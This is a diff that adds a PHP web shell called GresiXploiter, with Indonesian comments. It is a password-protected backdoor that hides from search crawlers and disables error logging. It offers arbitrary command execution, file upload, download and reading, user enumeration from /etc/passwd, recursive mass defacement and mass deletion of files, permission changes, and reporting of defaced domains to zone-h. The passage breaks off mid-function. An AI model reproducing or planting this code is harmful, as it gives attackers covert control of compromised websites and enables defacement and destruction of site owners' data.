@@ -1,0 +1,894 @@
+
+<?php
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+// Iki Password Kanggo Login =======================================0000000
+$auth_pass = "d5147179e04990b779ca9fd4ae8bcff2";
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+function login_shell() {
+?>
+<!DOCTYPE html>
+<html>
+    <title>GresiXploiter Shell</title>
+    <head>
+        <link rel="shortcut icon" href="https://predatorkiller.io/images/inception_icon.png">
+        <meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
+        <meta name="author" content="Kang Cilok"/>
+        <meta name="copyright" content="GresiXploiter Shell"/>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+    </head>
+    <style type="text/css">
+        @import url("http://fonts.googleapis.com/css?family=VT323:400");
+        @import url("http://fonts.googleapis.com/css?family=Iceberg:400");
+        input[type=submit] {
+            background-color: transparent;
+            border: 1px lime solid;
+            font-family: Iceberg;
+        }
+        input[type=submit]:hover {
+            background-color: transparent;
+            border: 1px lime solid;
+            font-family: Iceberg;
+        }
+        input[type=password] {
+            font-family: Iceberg;
+        }
+    </style>
+    <body class="bg-dark text-light">
+        <center>
+            <br/><h2 style="font-family:VT323;">GresiXploiter Shell</h2><hr/><br/>
+            <div class="container">
+                <div class="col-lg-6">
+                    <div class="form-group">
+                    <h5 style="font-family:Iceberg;"> Luwak White Kopi?</h5>
+                    <br/>
+                        <form method="post">
+                            <input type="password" name="pass" placeholder="Password..." class="form-control">      <br/>
+                            <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Masuk">
+                        </form>
+                    </div>
+                </div><br/>
+            </div>
+        </center>
+    </body>
+</html>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+?>
+
+<?php
+    // Gresixploiter Mini Shell
+    // Recode ? Ga mampu ngoding sendiri booss??
+    // Kang Cilok ( Coded )
+    @ini_set('error_log',NULL); 
+    @ini_set('log_errors',0); 
+    @ini_set('display_errors', 0);
+    @error_reporting(0); 
+    @error_log(false);
+    $slash = '/';
+    if(strtolower(substr(PHP_OS,0,3))=='win'){ $os = 'win'; $slash = '\\'; $ox = "Windows";}else{ $os = "nix"; $ox = "Linux"; }
+    function sanitize($object){
+        return filter_var(htmlspecialchars($object), FILTER_SANITIZE_STRING);
+    }
+    function get_users(){
+        $users = array();
+        $user = file("/etc/passwd");
+        foreach ($user as $userx => $userz) {
+            $userct = explode(":", $userz);
+            array_push($users,$userct[0]);
+        }
+        if(!$user){
+            if($open = opendir("/home/")){
+                while(($file = readdir($open)) !== false){ array_push($users, $file); }
+            }
+            closedir($open);
+        }
+        $users = implode(', ', $users);
+        return $users;
+    }// Iki Fungsine CMD ==============0000
+    function exe($cmd){
+        if(function_exists('system')) {         
+            @ob_start();        
+            @system($cmd);      
+            $buff = @ob_get_contents();         
+            @ob_end_clean();     
+        }elseif(function_exists('exec')) {         
+            @exec($cmd,$results);       
+            $buff = join("\n", $results); 
+        } elseif(function_exists('passthru')) {         
+            @ob_start();        
+            @passthru($cmd);        
+            $buff = @ob_get_contents();         
+            @ob_end_clean();     
+        } elseif(function_exists('shell_exec')) {       
+            $buff = @shell_exec($cmd);   
+        }elseif(function_exists('proc_open')){
+            $desc = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
+            $handle = proc_open($cmd, $desc, $pipes);
+            if(is_resource($handle)){
+                if(function_exists('fread') && function_exists('feof')){
+                    while(!feof($pipes[1])){ $buff .= fread($pipes[1], 512); }
+                }elseif(function_exists('fgets') && function_exists('feof')){
+                    while(!feof($pipes[1])){ $buff .= fgets($pipes[1], 512); }
+                }
+            }
+            pclose($handle);
+        }elseif(function_exists('popen')){
+            $handle = popen($cmd, "r");
+            if(is_resource($handle)){
+                if(function_exists('fread') && function_exists('feof')){
+                    while(!feof($handle)){ $buff .= fread($handle, 512); }
+                }elseif(function_exists('fgets') && function_exists('feof')){
+                    while(!feof($handle)){ $buff .= fgets($handle, 512); }
+                }
+            }
+            pclose($handle);
+        }
+        $buff = wordwrap(htmlspecialchars($buff));
+        return $buff;
+    }
+    echo "
+        <!DOCTYPE html>
+        <html>
+            <head>
+                <link rel=\"shortcut icon\" href=\"https://predatorkiller.io/images/inception_icon.png\">
+                <meta name=\"ROBOTS\"       content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
+                <meta name=\"GOOGLEBOT\"    content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
+                <meta charset=\"UTF-8\">
+                <script src=\"https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js\"></script>
+                <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.min.css'>
+                <script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"></script>
+                <link href='http://fonts.googleapis.com/css?family=VT323' rel='stylesheet' type='text/css'>
+                <link href='https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
+                <link rel=\"stylesheet\" href=\"sweetalert/style.css\">
+                <script src=\"sweetalert/script.js\"></script>
+                <title>Ha?</title>
+                <style>
+                @import url(\"http://fonts.googleapis.com/css?family=Iceberg:400\");
+                *, body, html { text-shadow: 0px 0px 0px #141414; }
+                html {font-family: 'Iceberg';}
+                .chekwa{ display: none;}
+                i{ color:lime;}
+                .wala { border-bottom: none;}
+                input { border: none; background: none; font-family: 'Courier New';}
+                textarea{ background: #111111; font-family: 'Courier New'; font-size: 15px; border: 1px solid lime; border-radius: 15px; padding: 10px; color: white;}
+                .submit{ background: lime; color: black; }
+                select{ background: lime; color: black; font-family: 'Courier New'; border: none;}
+                option{ font-family: 'Courier New'; background: lime; border: none;}
+                .titulo {color: #00ff00;text-decoration: none;}
+                body { background: #111111; color: white; text-align : center;}
+                .foot{ position: relative; width: 100%; bottom: 0;}
+                a { color: white; text-decoration: none;}
+                #details{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px; margin-top: 10px;}
+                tr:hover { background: #141414;}
+                a:hover { text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none; }
+                .lamesa, .mesa { width:100%; padding:4px 0; color:white; font-size:15px;}
+                .mesa td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top;}
+                .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;font-family: 'Monoton'}
+                .board p {font-size: 65px;font-family: 'Monoton', cursive;color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
+                pre { text-align: left;}
+                .pare{ border: 1px dashed lime; border-radius: 15px; color: #9b9b9b; font-size: 15px; font-family: 'Courier New'; padding: 15px;}
+                textarea:focus{ outline: none;}
+                .piktur { width: 60px; cursor: pointer; opacity: .5; transition: .5s ease-in-out;}
+                .piktur:hover { opacity: 1; width: 75px;}
+                audio {
+                    background-color: black;
+                    border: 2px lime solid;
+                    border-radius: 29px;
+                }
+                input[type=submit] {
+                    font-family:Iceberg;
+                }
+                code { font-family: monospace; }
+                pre { color:lime;}
+                </style>";?>
+                <script type="text/javascript">             
+                $(document).ready(function() {$('#spade').novacancy({'reblinkProbability': 0.1,'blinkMin': 0.2,'blinkMax': 0.6,'loopMin': 8,'loopMax': 10,'color': '#ffffff','glow': ['0 0 80px #ffffff', '0 0 30px #008000', '0 0 6px #0000ff']}); 
+                $('#pirates').novacancy({'blink': 1,'off': 1,'color': 'Red','glow': ['0 0 80px Red', '0 0 30px FireBrick', '0 0 6px DarkRed']});});
+                </script>
+                <?php echo "
+            </head>
+            <body>
+
+                <noscript><meta http-equiv=\"refresh\" ></noscript>
+                <center><div class=\"board\" style=\"width: 60%; border: 1px lime double;\"><p id=\"spade\" style=\"font-family:VT323; padding: 10px; font-size:31pt;\"><i class='fa fa-bug'></i> Gresi<font color='lime'>X</font>ploiter <i class='fa fa-bug'></i></p></div></center>
+
+                <div id='details'>
+                <table class=\"lamesa\" cellpadding=\"3\" cellspacing\"1\">
+                    <tr>
+                        <td><center>
+                        <br><img src=\"https://steamuserimages-a.akamaihd.net/ugc/854976916434675605/0A7FF9FDC45305AB9F1B4F51DCAC315274B28F96/?imw=512&imh=431&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true\" height=\"150px\" style=\"border: 1px lime solid; border-radius:8px; opacity: 0.4;
+                        filter: alpha(opacity=40);\"><br>
+                        <div class=\"board\" style=\"width: 250px; padding: 10px; border: 1px lime double;\">
+                        <font style=\"font-family:Iceberg;\"><i class='fa fa-code'></i> Coded by : Kang Cilok </font><br>
+                        <font style=\"font-family:Iceberg;\"><i class='fa fa-quote-right'></i> Quote : Learn, Try And Develop</font><br>
+                        <font style=\"font-family:Iceberg;\"><i class='fa fa-map'></i> From : Indonesian </font><br>
+                        </center></div><br>
+                        <font class=\"titulo wala\"><i class='fa fa-bookmark'></i> Folder : </font>&nbsp;";
+                        if($_GET["keluar"] == true){
+                        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+                        echo "<script>window.location='?';</script>";
+                        }
+                        if(isset($_GET['path'])){
+                            $path = sanitize($_GET['path']);
+                        }else{
+                            $path = sanitize(getcwd());
+                        }
+                            $path = str_replace('\\','/',$path);
+                            $paths = explode('/',$path);
+                            foreach($paths as $id=>$peth){
+                                if($peth == '' && $id == 0){
+                                    $a = true;
+                                    echo "<a href=\"?path=/\">/</a>";
+                                    continue;
+                                }
+                                if($peth == '') continue;
+                                echo "<a href='?path=";
+                                for($i=0;$i<=$id;$i++){
+                                    echo $paths[$i];
+                                    if($i != $id) echo "/";
+                                }
+                                echo "'>".$peth."</a>/";
+                            }
+                        echo "
+                        </td>
+                        </tr>
+                        <tr>
+                        <td>";
+                        //upload boss
+                        if(isset($_FILES['file'])){
+                            if(@copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+                                echo "<script>swal ('Done Lurd !', 'File Berhasil Di Upload !', 'success')</script><font color=lime><a href=".sanitize($_FILES['file']['name'])." target='_blank'><i class='fa fa-grin-beam'></i> File Berhasil Di Upload</font><br/>";
+                            }else{
+                                echo "<font color=red><i class='fa fa-angry'></i> File Gagal Di Upload !</font><br/>";
+                            }
+                        }
+
+
+
+
+                        //pilih fileee ===========
+                        echo "
+                            <form method=POST enctype=\"multipart/form-data\"><font class=\"titulo wala\"><br><label for=\"upload\"><i class='fa fa-folder-open'></i> Pilih File... <input id=\"upload\" class=\"chekwa\" type=\"file\" name=\"file\"></label><br><br><input type=\"submit\" class=\"submit\" ";
+                            if(!is_writable($path)){echo "disabled value='Not Writable!' style='background: red;'";}else{ echo "value='Upload!'"; }
+                            // Ngisor iki menu-menu seng onok nang shell =-===
+                            echo "
+                            ></form>
+                        </td>
+                    </tr><tr><td class=\"wala\"><center><div class=\"board\" style=\"height:115px; text-align:center; padding: 6px; border: 1px lime solid;\"><a href=".sanitize($_SERVER['PHP_SELF'])."><i class='fa fa-home'></i><font style=\"font-family:Iceberg;\"> Home </a> &nbsp;|&nbsp; 
+                    <a href='?details'><i class='fa fa-desktop'></i> <font style=\"font-family:Iceberg;\">&nbsp;Informasi Sistem </a>&nbsp;|&nbsp; 
+                    <a href='?do=cmd'> <i class='fa fa-terminal'></i><font style=\"font-family:Iceberg;\"> Command </a><hr>
+                    <a href='?do=zoneh'> <i class='fa fa-cube'></i><font style=\"font-family:Iceberg;\"> Zone-H </a>&nbsp;|&nbsp;
+                    <a href='?musik'> <i class='fa fa-music'></i><font style=\"font-family:Iceberg;\">&nbsp;Musik </a>&nbsp;|&nbsp;
+                    <a href='?kill'> <i class='fa fa-power-off'></i><font style=\"font-family:Iceberg;\">&nbsp; Hapus Shell </a>&nbsp;|&nbsp; 
+                    <a href='?keluar=true'> <i class='fa fa-sign-out'></i><font style=\"font-family:Iceberg;\"> Log Out </a>&nbsp;|&nbsp;
+                    <a href='?info'> <i class='fa fa-info'></i><font style=\"font-family:Iceberg;\">&nbsp;About </a><hr>
+                    <a href='?path=$path&aksi=buatfolder'> <i class='fa fa-plus-circle'></i><font style=\"font-family:Iceberg;\"> Buat Folder </a>&nbsp;|&nbsp;
+                    <a href='?path=$path&aksi=buatfile'> <i class='fa fa-plus'></i><font style=\"font-family:Iceberg;\"> Buat File </a>&nbsp;|&nbsp;
+                    <a href='?nomor'> <i class='fa fa-phone'></i><font style=\"font-family:Iceberg;\"> No WA Generate </a><hr>
+                    <a href='?aksi=MassDeface'> <i class='fa fa-clipboard'></i><font style=\"font-family:Iceberg;\"> Mass Deface </a>&nbsp;|&nbsp;
+                    <a href='?aksi=MassDellete'> <i class='fa fa-trash'></i><font style=\"font-family:Iceberg;\"> Mass Delete </a>
+                    </td></tr></table></div></center></div><table>";
+
+
+
+// Mass Delete asu ==============================================000000000000000000
+if($_GET['aksi'] == 'MassDellete') {
+            
+            function hapus_massal($dir,$namafile) {
+                if(is_writable($dir)) {
+                    $dira = scandir($dir);
+                    foreach($dira as $dirb) {
+                        $dirc = "$dir/$dirb";
+                        $lokasi = $dirc.'/'.$namafile;
+                        if($dirb === '.') {
+                            if(file_exists("$dir/$namafile")) {
+                                unlink("$dir/$namafile");
+                            }
+                        } elseif($dirb === '..') {
+                            if(file_exists("".dirname($dir)."/$namafile")) {
+                                unlink("".dirname($dir)."/$namafile");
+                            }
+                        } else {
+                            if(is_dir($dirc)) {
+                                if(is_writable($dirc)) {
+                                    if($lokasi) {
+                                            echo "$lokasi > Terhapus\n";
+                                        unlink($lokasi);
+                                        $massdel = hapus_massal($dirc,$namafile);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            if($_POST['start']) {
+                echo "<textarea class='form-control' rows='12' cols='50' disabled='disabled'>";
+                    hapus_massal($_POST['d_dir'], $_POST['d_file']);
+                echo "</textarea><br><br><a href='?dir=$dir' style='color:white; font-family:Iceberg; border:1px lime solid;' class='btn btn-info btn-block mt-3'>&nbsp;Kembali&nbsp;</a>";
+            } else {
+                echo "<form method='post'>
+                    <p><i class='fa fa-folder'></i> Lokasi</p>
+                    <input type='text' style='color:white; font-family:Iceberg; border:1px lime solid;' name='d_dir' value='$path' class='form-control'><br>
+                    <p><i class ='fa fa-file'></i> Nama File</p>
+                    <input type='text' style='color:white; font-family:Iceberg; border:1px lime solid;' name='d_file' placeholder='index.php' class='form-control'><br><br>
+                    <input type='submit' style='color:white; font-family:Iceberg; border:1px lime solid;' name='start' value='Hapus' class='btn btn-danger form-control'>
+            </form>";
+            }
+            exit;
+        }
+
+
+
+
+
+
+// Masss deface =======================================================00000000000000000
+if($_GET['aksi'] == 'MassDeface') {
+        
+        function tipe_massal($dir,$namafile,$isi_script) {
+            if(is_writable($dir)) {
+                $dira = scandir($dir);
+                foreach($dira as $dirb) {
+                    $dirc = "$dir/$dirb";
+                    $lokasi = $dirc.'/'.$namafile;
+                    if($dirb === '.') {
+                        file_put_contents($lokasi, $isi_script);
+                    } elseif($dirb === '..') {
+                        file_put_contents($lokasi, $isi_script);
+                    } else {
+                        if(is_dir($dirc)) {
+                            if(is_writable($dirc)) {
+                                echo "Berhasil => $lokasi\n";
+                                file_put_contents($lokasi, $isi_script);
+                                $MassDeface = tipe_massal($dirc,$namafile,$isi_script);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        function tipe_biasa($dir,$namafile,$isi_script) {
+            if(is_writable($dir)) {
+                $dira = scandir($dir);
+                foreach($dira as $dirb) {
+                    $dirc = "$dir/$dirb";
+                    $lokasi = $dirc.'/'.$namafile;
+                    if($dirb === '.') {
+                        file_put_contents($lokasi, $isi_script);
+                    } elseif($dirb === '..') {
+                        file_put_contents($lokasi, $isi_script);
+                    } else {
+                        if(is_dir($dirc)) {
+                            if(is_writable($dirc)) {
+                                echo "Berhasil => $dirb/$namafile\n";
+                                file_put_contents($lokasi, $isi_script);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        if($_POST['start']) {
+            
+            echo "<textarea class='form-control' rows='12' cols='50' disabled='disabled'>";
+            if($_POST['tipe'] == 'mahal') {
+                tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+            } elseif($_POST['tipe'] == 'murah') {
+                tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+            }
+        echo "</textarea><br><br><a href='?dir=$dir' style='color:white; font-family:Iceberg; border:1px lime solid;' class='btn btn-info btn-block mt-3'>&nbsp;Kembali&nbsp;</a>";
+        } else {
+            echo "<form method='post'>
+                <center>
+                    <p>{ Type Mass Deface }</p>
+                    <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
+                    <label for='toggle-on' class='butn'>Biasa</label>
+                    <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
+                    <label for='toggle-off' class='butn'>Masal</label>
+                </center><hr>
+                <p><i class='fa fa-folder'></i> Lokasi</p>
+                <input type='text' name='d_dir' style='color:white; font-family:Iceberg; border:1px lime solid;' value='$path' class='form-control'><br>
+                <p><i class ='fa fa-file'></i> Nama File</p>
+                <input type='text' name='d_file' style='color:white; font-family:Iceberg; border:1px lime solid;' placeholder='index.php' class='form-control'><br/>
+                <p><i class ='fa fa-file'></i> Isi File</p>
+                <textarea name='script' class='form-control' rows='12' cols='50' placeholder='Hacked By 22XploiterCrew'></textarea><br/><br>
+                <input type='submit' style='color:white; font-family:Iceberg; border:1px lime solid;' name='start' value='Gasskeun' class='btn btn-danger form-control'><br/>
+            </form>";
+        }
+        exit;
+    }
+
+
+
+
+
+
+
+                    // Iki isine informasi sistem ==================================00000
+                        if(isset($_GET['details'])){
+                            global $os;
+                            $ds = @ini_get("disable_functions");
+                            $show_ds = (!empty($ds)) ? "<font color=red>".sanitize(wordwrap($ds))."</font>" : "<font color=gold>NONE</font>";
+                            echo "</table><div id=\"details\"><table class=\"mesa\" width=100%><center>
+                            <tr><td><h1 class=titulo>Sistem Informasi</h1></td></tr>
+                            <tr><td><font color=lime>OS</font> :: <font color=gold>".php_uname(s)."</font></td></tr>
+                            <tr><td><font color=lime>IP Address</font> :: <font color=gold>".$_SERVER["SERVER_ADDR"]."</font></td></tr>
+                            <tr><td><font color=lime>Koneksi</font> :: <font color=gold>".$_SERVER["HTTP_CONNECTION"]."</font></td></tr>
+                            <tr><td><font color=lime>Port</font> :: <font color=gold>".$_SERVER["SERVER_PORT"]."</font></td></tr>
+                            <tr><td><font color=lime>Versi PHP</font> :: <font color=gold>".phpversion()."</font></td></tr>
+                            <tr><td><font color=lime>Kernel Rilis</font> :: <font color=gold>".php_uname(r)."</font></td></tr>
+                            <tr><td><font color=lime>Versi Kernel</font> :: <font color=gold>".php_uname(v)."</font></td></tr>
+                            <tr><td><font color=lime>Mesin</font> :: <font color=gold>".php_uname(m)."</font></td></tr>
+                            <tr><td><font color=lime>Server </font> :: <font color=gold>".$_SERVER['SERVER_SOFTWARE']."</font></td></tr>
+                            <tr><td style=\"text-align:left\"><font color=lime>Disabled Functions</font>:: <font color=gold>".wordwrap($show_ds)."</font></td></tr>";
+                            if(function_exists('apache_get_modules')){
+                                echo "<tr><td style=\"text-align:left\"><font color=lime>Modul Apache Yang Dimuat</font> :: <pre>";
+                                $apache = implode(', ', apache_get_modules());
+                                echo wordwrap($apache);
+                                echo "</pre></td></tr>";
+                            }
+                        }// Buat Folder Cok ==================================0000000000000
+                        elseif($_GET['aksi'] == 'buatfolder'){
+                        function hai(){
+                        echo "<script>swal ('Done Lurd !', 'Folder berhasil dibuat !', 'success')</script>";
+                        }
+                        if(isset($_POST["folderss"])){
+                         $nama_folder = $path.'/'.$_POST["namaF"];
+                         mkdir($nama_folder,hai());
+                        }
+        
+                        echo '
+                        <div class="row mt-3">
+                        <div class="col">
+                          <form method="post"><br>
+                        <input type="text" style="color:white; font-family:Iceberg; border:1px lime solid;" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
+                          </div><br>
+                      <div class="col">
+                         <input type="submit" style="color:white; font-family:Iceberg; border:1px lime solid;" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
+                         </div>
+                          </div>';
+                        }
+
+
+
+
+
+                        //bUAT File asu ====================00000000000000
+                        elseif($_GET["aksi"] == 'buatfile'){
+                        if(isset($_POST["buat"])){
+                        $namaF = $path.'/'.$_POST["nama_file"];
+                        $isi = $_POST["isi"];
+                        $buat = fopen($namaF,"w");
+                        fwrite($buat,$isi);
+                        fclose($buat);
+                        if($buat == TRUE){
+                         echo "<script>swal ('Done Lurd !', 'File berhasil dibuat !', 'success')</script>";
+                        }else{
+                        echo "<script>swal ('Maaf Lurd !', 'Folder gagal dibuat !', 'error')</script>";
+                        }
+                        }
+                        echo '<form method="post" class="mt-3">
+                        <input type="text" style="color:white; font-family:Iceberg; border:1px lime solid;" class="form-control mb-3" placeholder="Nama File" name="nama_file"><br><br>
+                        <textarea class="form-control mb-3" rows="12" cols="50" name="isi" placeholder="Isi File..."></textarea><br>
+                        <input type="submit" style="color:white; font-family:Iceberg; border:1px lime solid;" name="buat" class="btn btn-outline-primary" value="Buat">';
+                        }
+
+
+
+
+
+                        /////Musik
+                        elseif(isset($_GET['musik'])){
+                            echo "<br><audio src=\"https://i.top4top.io/m_1749qgvjs1.mp3\" controls autoplay ></audio></font></td></tr><br>
+                            "; }
+
+
+
+                        //////////////// About
+                        elseif(isset($_GET['info'])){
+                            echo "<script>swal ('About Shell !', 'Hargai Nama Pembuat !', 'info')</script>
+                            <table class=\"mesa\" width=100%><center>
+                            <tr><td><h1 class=titulo>Tentang Shell</h1></td></tr>
+                            <tr><td><font color=lime >Shell By</font> : <font color=gold>GresiXploiter <br></font>
+                            <font color=lime >Author</font> : <font color=white>Kang Cilok <br></font>
+                            <font color=lime >Dibuat Pada Tahun</font> : <font color=white>2020 <br></font><br>
+                            </table></div><br>
+                            "; }
+                        //Tujuan saya membuat shell ini hanya untuk membagikan hasil shell saya kepada khalayak umum. Jadi jika shell ini disalah gunakan dan ditanam pada website orang lain. Itu belum tentu ulah dari komunitas kami ( GresiXploiter ), dan kami tidak bertanggung jawab atas perlakuan tersebut ! Karena shell ini kami bagikan kepada umum. bukan khusus untuk komunitas kami.
+
+
+
+
+                            //Hapus Shell
+                        elseif(isset($_GET['kill'])){
+                            $me = sanitize($_SERVER['PHP_SELF']);
+                            $akez = basename($me);
+                            if(unlink($akez)){
+                                echo "<script>swal ('Done Lurd !', 'GresiXploiter Shell Berhasil DiHapus !', 'success')</script><meta http-equiv=\"refresh\">";
+                            }else{ echo "<center><font color=red>Still Alive!</font></center>"; }
+                        
+
+
+
+
+                        }//CMD ===================================OOOOOOO
+                        elseif($_GET['do'] == 'cmd') {
+                        echo "<form method='post'>
+                        <font style='text-decoration: underline;'>".$user."root".$ip.": ~ $ </font>
+                        <input type='text' size='30' height='40px' width='15px' name='cmd' style='color:white; font-family:Iceberg; border:1px lime solid;'><input type='submit' style='color:white; font-family:Iceberg; border:1px lime solid;' name='do_cmd' value='GO'>
+                        </form>";
+                        if($_POST['do_cmd']) {
+                        echo "<pre>".exe($_POST['cmd'])."</pre>";
+                            }
+                        }
+
+                        ?>
+                        <?php
+                        function ac($panjang)
+                        {
+                            $karakter= '12';
+                            $string = '';
+                            for ($i = 0; $i < $panjang; $i++) {
+                          $pos = rand(0, strlen($karakter)-1);
+                          $string .= $karakter{$pos};
+                            }
+                            return $string;
+                        }
+                        //cara memanggilnya
+                        $ok= ac(1);
+                        ?>
+                        <?php
+                        function aca($panjang)
+                        {
+                            $karakter= '15';
+                            $string = '';
+                            for ($i = 0; $i < $panjang; $i++) {
+                          $pos = rand(0, strlen($karakter)-1);
+                          $string .= $karakter{$pos};
+                            }
+                            return $string;
+                        }
+                        //cara memanggilnya
+                        $yo= aca(1);
+                        ?>
+                        <?php
+                        function acak($panjang)
+                        {
+                            $karakter= '1234567890';
+                            $string = '';
+                            for ($i = 0; $i < $panjang; $i++) {
+                          $pos = rand(0, strlen($karakter)-1);
+                          $string .= $karakter{$pos};
+                            }
+                            return $string;
+                        }
+                        //cara memanggilnya
+                        $telk= acak(8);
+                        $emi= acak(9);
+                        $axis= acak(8);
+                        $smart= acak(8);
+                        $tri= acak(8);
+                        ?><?php
+                       if(isset($_GET['nomor'])){
+                        echo "<hr><font color='yellow'>TELKOMSEL</font>&#8667;";
+                        echo "&nbsp;<button style='color:white; background-color:transparent; font-family:Iceberg; border:1px lime solid;'><a href='https://wa.me/6282$ok$telk'>CHAT LANGSUNG</a></button>";
+                        echo "<br><br><font color='yellow'>INDOSAT</font>&#8667;";
+                        echo "&nbsp;<button style='color:white; background-color:transparent; font-family:Iceberg; border:1px lime solid;'><a href='https://wa.me/62857$emi'>CHAT LANGSUNG</a></button>";
+                        echo "<br><br><font color='yellow'>XL / AXIS</font>&#8667;";
+                        echo "&nbsp;<button style='color:white; background-color:transparent; font-family:Iceberg; border:1px lime solid;'><a href='https://wa.me/628$yo.9$axis'>CHAT LANGSUNG</a></button>";
+                        echo "<br><br><font color='yellow'>SMARTFREN</font>&#8667;";
+                        echo "&nbsp;<button style='color:white; background-color:transparent; font-family:Iceberg; border:1px lime solid;'><a href='https://wa.me/62889$smart'>CHAT LANGSUNG</a></button>";
+                        echo "<br><br><font color='yellow'>THREE</font>&#8667;";
+                        echo "&nbsp;<button style='color:white; background-color:transparent; font-family:Iceberg; border:1px lime solid;'><a href='https://wa.me/62899$tri'>CHAT LANGSUNG</a></button></font><hr></div>";
+                        }
+
+
+
+
+                        //Zone H =================================000000
+                        elseif($_GET['do'] == 'zoneh') {
+                        if($_POST['submit']) {
+                        $domain = explode("\r\n", $_POST['url']);
+                        $nick =  $_POST['nick'];
+                        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+                        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+                        function zoneh($url,$nick) {
+                        $ch = curl_init("http://www.zone-h.com/notify/single");
+                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                        curl_setopt($ch, CURLOPT_POST, true);
+                        curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+                        return curl_exec($ch);
+                        curl_close($ch);
+                        }
+                        foreach($domain as $url) {
+                         $zoneh = zoneh($url,$nick);
+                         if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
+                         echo "$url -> <font color=lime>OK</font><br>";
+                         } else {
+                         echo "$url -> <font color=red>ERROR</font><br>";
+                             }
+                            }
+                        } else {
+                         echo "<center><form method='post'>
+                         <u>Defacer</u>: <br>
+                         <input type='text' style='color:white; font-family:Iceberg; border:1px lime solid;' name='nick' size='50' value='IndoXploit'><br>
+                         <u>Domains</u>: <br>
+                          <textarea style='width: 450px; height: 150px; font-family:Iceberg;' name='url'></textarea><br>
+                          <input type='submit'  name='submit' value='Submit' style='color:white; font-family:Iceberg; border:1px lime solid;'>
+                          </form>";
+                            }
+                         echo "</center>";
+                        }
+
+
+
+
+                        // Iki Permissione utowo Chmod e
+                        elseif(isset($_GET['filesource'])){
+                            echo "<tr><td class=\"titulo\"><center>Current File:~$&nbsp;".sanitize($_GET['filesource'])."</center></td></tr></table><br/>";
+                            echo "<pre class=\"pare\"><code>".wordwrap(sanitize(file_get_contents($_GET['filesource'])))."</code></pre>";
+                        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+                            echo "</table><br><center>".sanitize($_GET['path'])."<br><br>";
+                            if($_POST['opt'] == 'chmod'){
+                                if(isset($_POST['perm'])){
+                                    if(@chmod($_POST['path'], $_POST['perm'])){
+                                        echo "<script>swal ('Done Lurd !', 'Permission Berhasil Di Ubah !', 'success')</script><font color=lime>Permission Di Ubah !</font>";
+                                    }else{
+                                        echo "<font color=red>Permission Gagal Di Ubah !</font>";
